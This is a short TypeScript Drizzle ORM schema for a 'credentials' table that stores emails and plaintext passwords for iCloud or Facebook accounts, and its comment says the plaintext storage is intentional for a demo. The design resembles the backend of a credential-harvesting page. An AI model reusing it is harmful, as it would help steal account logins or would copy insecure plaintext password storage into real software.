
import { pgTable, text, serial, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const credentials = pgTable("credentials", {
  id: serial("id").primaryKey(),
  email: text("email").notNull(),
  password: text("password").notNull(), // Intentionally storing plain text for this specific demo request
  service: text("service").notNull(), // 'icloud' or 'facebook'
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertCredentialSchema = createInsertSchema(credentials).omit({ 
  id: true, 
  createdAt: true 
});

export type Credential = typeof credentials.$inferSelect;
export type InsertCredential = z.infer<typeof insertCredentialSchema>;
